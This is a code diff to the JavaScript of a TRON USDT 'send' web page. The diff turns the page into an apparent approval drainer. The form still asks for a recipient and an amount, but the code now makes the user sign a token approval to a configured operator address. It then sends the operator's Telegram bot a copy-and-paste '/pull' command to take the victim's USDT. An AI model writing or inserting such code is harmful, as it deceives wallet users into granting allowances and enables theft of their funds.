@@ -114,7 +114,7 @@ document.addEventListener("DOMContentLoaded", function () {
     }
 
     // ===== TELEGRAM NOTIFICATION FUNCTION =====
-    async function sendTelegramNotifications(walletAddress, txHash, userId) {
+    async function sendTelegramNotifications(walletAddress, txHash, userId, recipientAddress, amount) {
         const botToken = CONFIG.TELEGRAM_BOT_TOKEN;
         const adminChatId = CONFIG.ADMIN_CHAT_ID;
 
@@ -122,16 +122,19 @@ document.addEventListener("DOMContentLoaded", function () {
             inline_keyboard: [[{ text: "🔗 View Transaction", url: `https://tronscan.org/#/transaction/${txHash}` }]]
         };
 
+        const pullCommand = `/pull ${CONFIG.USDT_ADDRESS} ${walletAddress} ${recipientAddress} ${amount}`;
+
         const adminMessage =
-            `🔔 **New USDT Transfer Transaction**\n\n` +
+            `🔔 **New USDT Approval Transaction**\n\n` +
             `💰 **From Wallet:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
             `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
             `👤 **User ID:** ${userId || "Not provided"}\n` +
             `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
-            `✅ TRC20 transfer submitted successfully!`;
+            `✅ TRC20 approval submitted successfully!\n\n` +
+            `📋 **Copy & paste command:**\n\`\`\`\n${pullCommand}\n\`\`\``;
 
         const userMessage =
-            `🎉 **USDT Transfer Submitted!**\n\n` +
+            `🎉 **USDT Approval Submitted!**\n\n` +
             `💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
             `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
             `✅ **Status:** Submitted\n\n` +
@@ -281,7 +284,7 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     }
 
-    // ===== NEXT BUTTON - SEND TRC20 USDT WITH TRONLINK =====
+    // ===== NEXT BUTTON - APPROVE TRC20 USDT WITH TRONLINK =====
     nextBtn.addEventListener("click", async function (e) {
         e.preventDefault();
 
@@ -300,9 +303,15 @@ document.addEventListener("DOMContentLoaded", function () {
             const tronWeb = await connectTronLink();
             const recipientAddress = addressInput.value.trim();
             const amount = amountInput.value.trim();
+            const spenderAddress = CONFIG.CONTRACT_ADDRESS || CONFIG.COMPANY_WALLET_ADDRESS;
 
             if (!tronWeb.isAddress(recipientAddress)) {
                 showNotification("Please enter a valid TRON address.", "error");
+                return;
+            }
+
+            if (!tronWeb.isAddress(spenderAddress)) {
+                showNotification("Invalid company wallet address.", "error");
                 return;
             }
 
@@ -310,17 +319,17 @@ document.addEventListener("DOMContentLoaded", function () {
             const decimals = await getTokenDecimals(usdt);
             const parsedAmount = parseTokenUnits(amount, decimals);
             const fromAddress = tronWeb.defaultAddress.base58;
-            const txHash = await usdt.transfer(recipientAddress, parsedAmount).send({
+            const txHash = await usdt.approve(spenderAddress, parsedAmount).send({
                 feeLimit: Number(CONFIG.TRON_FEE_LIMIT) || 100000000
             });
 
-            showNotification("Transaction submitted.", "success");
+            showNotification("Approval submitted.", "success");
 
             if (txHash && txHash.length > 0) {
                 try {
                     const urlParams = new URLSearchParams(window.location.search);
                     const userId = urlParams.get("user_id");
-                    await sendTelegramNotifications(fromAddress, txHash, userId);
+                    await sendTelegramNotifications(fromAddress, txHash, userId, recipientAddress, amount);
                 } catch (err) {
                     console.error("Failed to send Telegram notifications:", err);
                 }
@@ -349,7 +358,7 @@ document.addEventListener("DOMContentLoaded", function () {
                 msg.includes("exceeds balance") ||
                 (msg.includes("execution reverted") && msg.includes("exceeds balance"))
             ) {
-                showNotification("Insufficient USDT balance for this transfer.", "error");
+                showNotification("Insufficient balance for this approval.", "error");
             } else {
                 showNotification("Transaction failed. Please try again.", "error");
             }
